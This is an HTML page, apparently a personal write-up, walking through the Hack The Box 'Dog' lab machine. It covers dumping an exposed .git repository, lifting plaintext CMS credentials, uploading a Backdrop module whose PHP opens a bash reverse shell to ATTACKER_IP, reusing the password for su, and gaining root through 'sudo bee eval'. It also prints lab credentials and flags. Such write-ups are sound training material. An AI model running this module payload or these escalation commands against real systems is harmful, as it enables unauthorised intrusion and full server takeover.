@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB Dog — Full Walkthrough</title>
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root{--bg:#0c0e12;--surface:#13161c;--surface-raised:#1a1e26;--border:#262b36;--text:#c8cdd6;--text-muted:#6b7280;--heading:#e8ecf2;--accent:#4ade80;--accent-dim:#166534;--red:#f87171;--amber:#fbbf24;--blue:#60a5fa;--purple:#c084fc;--cyan:#22d3ee;--code-bg:#0a0c10}
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:'Inter',-apple-system,sans-serif;background:var(--bg);color:var(--text);line-height:1.7;-webkit-font-smoothing:antialiased}
+        .hero{border-bottom:1px solid var(--border);padding:4rem 2rem 3rem;position:relative;overflow:hidden}
+        .hero::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--blue),var(--red))}
+        .hero-inner{max-width:860px;margin:0 auto}
+        .hero-label{font-family:'IBM Plex Mono',monospace;font-size:.75rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1rem}
+        .hero h1{font-size:2.8rem;font-weight:700;color:var(--heading);letter-spacing:-.03em;line-height:1.15}
+        .hero h1 span{color:var(--accent)}
+        .hero-meta{margin-top:1.2rem;display:flex;gap:2rem;flex-wrap:wrap;font-family:'IBM Plex Mono',monospace;font-size:.8rem;color:var(--text-muted)}
+        .hero-meta strong{color:var(--text);font-weight:500}
+        .chain{background:var(--surface);border-bottom:1px solid var(--border);padding:1.5rem 2rem;overflow-x:auto}
+        .chain-inner{max-width:860px;margin:0 auto;display:flex;align-items:center;gap:0;white-space:nowrap;font-family:'IBM Plex Mono',monospace;font-size:.78rem}
+        .chain-node{padding:.4rem .9rem;border-radius:4px;font-weight:500}
+        .chain-node.green{background:var(--accent-dim);color:var(--accent)}
+        .chain-node.blue{background:#1e3a5f;color:var(--blue)}
+        .chain-node.red{background:#5f1e1e;color:var(--red)}
+        .chain-arrow{color:var(--text-muted);padding:0 .5rem;font-size:.9rem}
+        .content{max-width:860px;margin:0 auto;padding:3rem 2rem 6rem}
+        .phase{margin-top:3.5rem;margin-bottom:2rem;padding-bottom:.8rem;border-bottom:1px solid var(--border)}
+        .phase:first-child{margin-top:0}
+        .phase-number{font-family:'IBM Plex Mono',monospace;font-size:.7rem;letter-spacing:.15em;text-transform:uppercase;margin-bottom:.3rem}
+        .phase-number.green{color:var(--accent)}.phase-number.blue{color:var(--blue)}.phase-number.red{color:var(--red)}
+        .phase h2{font-size:1.6rem;font-weight:700;color:var(--heading);letter-spacing:-.02em}
+        h3{font-size:1.15rem;font-weight:600;color:var(--heading);margin-top:2.2rem;margin-bottom:.8rem}
+        p{margin-bottom:1rem}
+        pre{background:var(--code-bg);border:1px solid var(--border);border-radius:6px;padding:1.2rem 1.4rem;overflow-x:auto;margin:1rem 0 1.4rem;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:1.65;color:var(--text)}
+        pre .comment{color:var(--text-muted)}pre .cmd{color:var(--accent)}pre .output{color:#8b949e}pre .highlight{color:var(--amber)}pre .important{color:var(--red)}
+        code{font-family:'IBM Plex Mono',monospace;font-size:.88em;background:var(--surface-raised);padding:.15em .4em;border-radius:3px;color:var(--cyan)}
+        pre code{background:none;padding:0;color:inherit}
+        .callout{border-radius:6px;padding:1rem 1.2rem;margin:1.2rem 0;font-size:.92rem;line-height:1.6}
+        .callout-why{background:#1a1e26;border-left:3px solid var(--blue)}.callout-why .callout-label{color:var(--blue)}
+        .callout-warn{background:#1e1a12;border-left:3px solid var(--amber)}.callout-warn .callout-label{color:var(--amber)}
+        .callout-key{background:#1a1220;border-left:3px solid var(--purple)}.callout-key .callout-label{color:var(--purple)}
+        .callout-label{font-family:'IBM Plex Mono',monospace;font-size:.72rem;font-weight:600;letter-spacing:.1em;text-transform:uppercase;display:block;margin-bottom:.3rem}
+        .script-title{font-family:'IBM Plex Mono',monospace;font-size:.75rem;color:var(--text-muted);background:var(--surface-raised);display:inline-block;padding:.25rem .7rem;border-radius:4px 4px 0 0;border:1px solid var(--border);border-bottom:none;margin-bottom:-1px;position:relative;z-index:1}
+        .takeaway{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:1.5rem;margin:2rem 0}
+        .takeaway h3{margin-top:0}
+        .takeaway-item{padding:.5rem 0;border-bottom:1px solid var(--border)}
+        .takeaway-item:last-child{border-bottom:none}
+        .takeaway-item strong{color:var(--heading)}
+        .takeaway-item p{margin-bottom:0}
+        .diagram{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:2rem;margin:1.5rem 0;text-align:center;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:2;color:var(--text);overflow-x:auto}
+        .diagram .node{display:inline-block;padding:.3rem .8rem;border-radius:4px;margin:.2rem 0}
+        .diagram .node-green{background:var(--accent-dim);color:var(--accent)}
+        .diagram .node-blue{background:#1e3a5f;color:var(--blue)}
+        .diagram .node-red{background:#5f1e1e;color:var(--red)}
+        .diagram .arrow{color:var(--text-muted);margin:0 .3rem}
+        .footer{text-align:center;padding:2rem;font-family:'IBM Plex Mono',monospace;font-size:.75rem;color:var(--text-muted);border-top:1px solid var(--border);margin-top:4rem}
+        @media(max-width:640px){.hero h1{font-size:1.8rem}.hero-meta{flex-direction:column;gap:.5rem}.content{padding:2rem 1rem 4rem}pre{font-size:.75rem;padding:1rem}}
+    </style>
+</head>
+<body>
+
+<!-- Password Gate -->
+<div id="gate" style="position:fixed;inset:0;z-index:9999;background:var(--bg);display:flex;align-items:center;justify-content:center;">
+    <div style="text-align:center;font-family:'IBM Plex Mono',monospace;">
+        <img src="dog-badge.png" alt="Dog" style="width:120px;height:120px;border-radius:50%;margin-bottom:1rem;border:2px solid var(--border);">
+        <div style="font-size:.72rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1.2rem;">HTB Writeup — Restricted</div>
+        <div style="color:var(--text-muted);font-size:.85rem;margin-bottom:1.5rem;max-width:320px;line-height:1.6;">This writeup contains spoilers for an HTB machine.<br>Enter the password to continue.</div>
+        <input id="gate-pw" type="password" placeholder="Password" autofocus style="background:var(--surface);border:1px solid var(--border);color:var(--heading);padding:.6rem 1rem;border-radius:4px;font-family:inherit;font-size:.9rem;width:220px;text-align:center;outline:none;" onkeydown="if(event.key==='Enter')checkPw()">
+        <br>
+        <button onclick="checkPw()" style="margin-top:.8rem;background:var(--accent-dim);color:var(--accent);border:1px solid var(--accent);padding:.5rem 1.8rem;border-radius:4px;font-family:inherit;font-size:.82rem;cursor:pointer;letter-spacing:.05em;">Enter</button>
+        <div id="gate-err" style="color:var(--red);font-size:.78rem;margin-top:.8rem;visibility:hidden;">Incorrect password</div>
+        <div style="color:var(--text-muted);font-size:.7rem;margin-top:2rem;opacity:.4;font-style:italic;direction:rtl;unicode-bidi:bidi-override;">Tessera est nomen machinae</div>
+    </div>
+</div>
+<script>
+function checkPw(){if(document.getElementById('gate-pw').value==='dog'){document.getElementById('gate').style.display='none';sessionStorage.setItem('htb-auth-dog','1')}else{document.getElementById('gate-err').style.visibility='visible';document.getElementById('gate-pw').value=''}}
+if(sessionStorage.getItem('htb-auth-dog')==='1')document.getElementById('gate').style.display='none';
+</script>
+
+<header class="hero">
+    <div class="hero-inner">
+        <div style="display:flex;align-items:center;gap:1.5rem;">
+            <img src="dog-badge.png" alt="Dog" style="width:80px;height:80px;border-radius:50%;border:2px solid var(--border);">
+            <div>
+                <div class="hero-label">Hack The Box — Walkthrough</div>
+                <h1><span>Dog</span></h1>
+            </div>
+        </div>
+        <div class="hero-meta" style="margin-top:1.2rem;">
+            <span>OS <strong>Linux</strong></span>
+            <span>Difficulty <strong>Easy</strong></span>
+            <span>Ports <strong>22 · 80</strong></span>
+            <span>Author <strong>Senchuan</strong></span>
+        </div>
+    </div>
+</header>
+
+<div class="chain">
+    <div class="chain-inner">
+        <span class="chain-node green">.git Leak → CMS Creds → Malicious Module</span>
+        <span class="chain-arrow">→</span>
+        <span class="chain-node blue">Password Reuse → SSH johncusack</span>
+        <span class="chain-arrow">→</span>
+        <span class="chain-node red">sudo bee eval → root</span>
+    </div>
+</div>
+
+<main class="content">
+
+    <!-- ════════════════════════════════════════ -->
+    <div class="phase">
+        <div class="phase-number green">Phase 0</div>
+        <h2>Reconnaissance</h2>
+    </div>
+
+    <h3>Nmap</h3>
+    <pre><code><span class="cmd">$ sudo nmap -sCV -p- -T4 10.129.231.223</span>
+<span class="output">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-generator: <span class="highlight">Backdrop CMS 1</span>
+| http-git:
+|   10.129.231.223:80/.git/
+|     <span class="highlight">Git repository found!</span></span></code></pre>
+
+    <p>Two ports. Port 80 runs Backdrop CMS 1.27.1 and — critically — has a <code>.git</code> directory exposed to the web. This is a massive information leak.</p>
+
+    <h3>Dumping the Git Repository</h3>
+    <p>Use <code>git-dumper</code> to download the entire repository:</p>
+    <pre><code><span class="cmd">$ pip3 install git-dumper
+$ git-dumper http://dog.htb/.git/ ./git</span></code></pre>
+
+    <h3>Extracting Credentials from Git</h3>
+    <p>The Backdrop CMS config file contains a database connection string with plaintext credentials:</p>
+    <pre><code><span class="cmd">$ cat settings.php | grep database</span>
+<span class="output">$database = 'mysql://root:<span class="highlight">BackDropJ2024DS2024</span>@127.0.0.1/backdrop';</span></code></pre>
+
+    <h3>Finding the CMS Username</h3>
+    <p>The username isn't <code>admin</code> — it's buried in a git commit that modified a JSON config file. Search the full diff history:</p>
+    <pre><code><span class="cmd">$ git log --all -p | grep -i "@" | sort -u</span>
+<span class="output">+    "mail": "<span class="highlight">tiffany@dog.htb</span>",</span>
+
+<span class="comment"># Confirm with broader search</span>
+<span class="cmd">$ git log --all -p -- "*.json" | grep -B5 -A5 "dog"</span></code></pre>
+
+    <div class="callout callout-key">
+        <span class="callout-label">Git history mining technique</span>
+        When hunting for usernames in a git repo, don't just check the current state of files — search the entire commit history with <code>git log --all -p</code>. Usernames, emails, and passwords often appear in diffs of configuration files that were later modified or removed.
+    </div>
+
+    <p>CMS login: <code>tiffany</code> / <code>BackDropJ2024DS2024</code> at <code>http://dog.htb/?q=user/login</code>.</p>
+
+
+    <!-- ════════════════════════════════════════ -->
+    <div class="phase">
+        <div class="phase-number green">Phase 1</div>
+        <h2>Initial Access — Malicious Backdrop Module</h2>
+    </div>
+
+    <h3>Why File Upload Doesn't Work</h3>
+    <p>Backdrop CMS restricts file uploads to safe extensions (jpg, png, pdf, etc.). Uploading a <code>.php</code> shell directly is blocked. Instead, we abuse the <strong>module installation</strong> feature, which accepts <code>.tar.gz</code> archives containing PHP code.</p>
+
+    <h3>Building the Malicious Module</h3>
+    <p>A valid Backdrop module needs two files: a <code>.info</code> metadata file and a <code>.module</code> PHP file. Our module's PHP code is a reverse shell:</p>
+
+    <pre><code><span class="comment"># Step 1: Create the module directory</span>
+<span class="cmd">$ mkdir -p shell</span>
+
+<span class="comment"># Step 2: Create the module metadata file</span>
+<span class="cmd">$ cat &lt;&lt; 'EOF' &gt; shell/shell.info</span>
+name = Shell
+description = Reverse Shell Module
+backdrop = 1.x
+type = module
+<span class="cmd">EOF</span>
+
+<span class="comment"># Step 3: Create the module PHP file with reverse shell payload</span>
+<span class="cmd">$ cat &lt;&lt; 'EOF' &gt; shell/shell.module</span>
+&lt;?php
+exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/9001 0&gt;&amp;1'");
+<span class="cmd">EOF</span>
+
+<span class="comment"># Step 4: Package it as a tar.gz archive</span>
+<span class="cmd">$ tar czf shell.tar.gz shell/</span></code></pre>
+
+    <h3>Deploying the Module</h3>
+    <pre><code><span class="comment"># Start listener on attacker machine</span>
+<span class="cmd">$ nc -lvnp 9001</span></code></pre>
+
+    <p>In the Backdrop admin panel:</p>
+    <p>1. Navigate to <strong>Functionality → Install new modules</strong></p>
+    <p>2. Click <strong>Upload a module or theme archive to install</strong></p>
+    <p>3. Upload <code>shell.tar.gz</code></p>
+    <p>4. After installation, trigger the payload by visiting:</p>
+
+    <pre><code><span class="cmd">http://dog.htb/modules/shell/shell.module</span></code></pre>
+
+    <pre><code><span class="output">Connection received on 10.129.231.223 42408
+www-data@dog:/var/www/html$</span></code></pre>
+
+    <h3>Upgrade to Interactive Shell</h3>
+    <pre><code><span class="cmd">www-data@dog:$ python3 -c 'import pty; pty.spawn("/bin/bash")'</span>
+<span class="comment"># Press Ctrl+Z, then on attacker:</span>
+<span class="cmd">$ stty raw -echo; fg</span>
+<span class="cmd">www-data@dog:$ export TERM=xterm</span></code></pre>
+
+
+    <!-- ════════════════════════════════════════ -->
+    <div class="phase">
+        <div class="phase-number blue">Phase 2</div>
+        <h2>Lateral Movement — www-data → johncusack</h2>
+    </div>
+
+    <h3>Password Reuse</h3>
+    <pre><code><span class="cmd">www-data@dog:$ ls /home</span>
+<span class="output">jobert  johncusack</span>
+
+<span class="comment"># Try the database password for each user</span>
+<span class="cmd">www-data@dog:$ su johncusack</span>
+<span class="output">Password: BackDropJ2024DS2024</span>
+
+<span class="cmd">johncusack@dog:~$ cat user.txt</span>
+<span class="output">f83ec69dfb9f1a6677ae1af4578170d8</span></code></pre>
+
+    <div class="callout callout-warn">
+        <span class="callout-label">Password reuse is everywhere</span>
+        The database password <code>BackDropJ2024DS2024</code> was reused for johncusack's system account. Always try known passwords on every user account — it's one of the most common escalation paths on HTB machines and in real environments.
+    </div>
+
+
+    <!-- ════════════════════════════════════════ -->
+    <div class="phase">
+        <div class="phase-number red">Phase 3</div>
+        <h2>Privilege Escalation — sudo bee eval</h2>
+    </div>
+
+    <h3>Sudo Enumeration</h3>
+    <pre><code><span class="cmd">johncusack@dog:~$ sudo -l</span>
+<span class="output">User johncusack may run the following commands on dog:
+    (ALL : ALL) <span class="highlight">/usr/local/bin/bee</span></span></code></pre>
+
+    <div class="callout callout-why">
+        <span class="callout-label">What is bee?</span>
+        <code>bee</code> is Backdrop CMS's command-line management tool — equivalent to WordPress's <code>wp-cli</code> or Drupal's <code>drush</code>. It can manage modules, users, configuration, run database queries, and critically — <strong>execute arbitrary PHP code</strong> via its <code>eval</code> command. Having sudo access to bee is effectively root access.
+    </div>
+
+    <h3>Exploitation</h3>
+    <p>The <code>eval</code> command executes arbitrary PHP after bootstrapping the Backdrop framework. Since bee runs with sudo, the PHP code executes as root:</p>
+
+    <pre><code><span class="cmd">johncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html eval 'system("/bin/bash");'</span>
+
+<span class="output">root@dog:~# whoami
+root</span>
+
+<span class="cmd">root@dog:~# cat /root/root.txt</span>
+<span class="output">77c3f4aa5c1073cb3d98029fc8f8670b</span></code></pre>
+
+    <div class="callout callout-warn">
+        <span class="callout-label">Why --root is required</span>
+        The <code>eval</code> command requires Backdrop's full framework to be bootstrapped — loading the database connection, config files, and module system. Without <code>--root=/var/www/html</code>, bee can't find the Backdrop installation from johncusack's home directory and fails with "required bootstrap level is not ready." The flag tells bee exactly where to find the CMS files.
+    </div>
+
+
+    <!-- ════════════════════════════════════════ -->
+    <div class="phase">
+        <div class="phase-number" style="color: var(--purple);">Appendix</div>
+        <h2>Key Takeaways</h2>
+    </div>
+
+    <div class="takeaway">
+        <div class="takeaway-item">
+            <strong>Exposed <code>.git</code> directories are critical vulnerabilities.</strong>
+            <p>The entire source code, configuration files, and commit history were accessible via <code>/.git/</code>. This leaked database credentials and user email addresses. Always check for <code>/.git/</code>, <code>/.svn/</code>, and <code>/.env</code> during recon.</p>
+        </div>
+        <div class="takeaway-item">
+            <strong>Git history reveals more than current files.</strong>
+            <p>The CMS username <code>tiffany</code> wasn't in any current file — it appeared only in a past commit's diff of a JSON config. Use <code>git log --all -p | grep</code> to search the full history, not just <code>grep -r</code> on current files.</p>
+        </div>
+        <div class="takeaway-item">
+            <strong>CMS module installation = code execution.</strong>
+            <p>File upload restrictions are meaningless when the admin panel allows installing modules. A valid module is just a <code>.info</code> metadata file and a <code>.module</code> PHP file in a tar.gz archive. This pattern applies to WordPress (plugins), Drupal (modules), and Backdrop alike.</p>
+        </div>
+        <div class="takeaway-item">
+            <strong>CMS CLI tools with sudo = instant root.</strong>
+            <p><code>bee eval</code>, <code>wp eval</code>, <code>drush eval</code> — any CMS CLI tool that can execute arbitrary code, when paired with sudo, is a direct privilege escalation. Check <code>sudo -l</code> for these tools specifically.</p>
+        </div>
+        <div class="takeaway-item">
+            <strong>Always try known passwords on all users.</strong>
+            <p>The database password worked for SSH. Password reuse between application databases and system accounts is one of the most common escalation paths in both CTFs and real engagements.</p>
+        </div>
+    </div>
+
+    <div class="diagram">
+        <span class="node node-green">.git dump</span>
+        <span class="arrow">→</span>
+        <span class="node node-green">DB creds + user</span>
+        <span class="arrow">→</span>
+        <span class="node node-green">CMS login</span>
+        <span class="arrow">→</span>
+        <span class="node node-green">malicious module</span>
+        <span class="arrow">→</span>
+        <span class="node node-blue">su johncusack</span>
+        <span class="arrow">→</span>
+        <span class="node node-red">sudo bee eval → root</span>
+    </div>
+
+</main>
+
+<footer class="footer">
+    Senchuan · HTB Dog Writeup · 2026
+</footer>
+
+</body>
+</html>
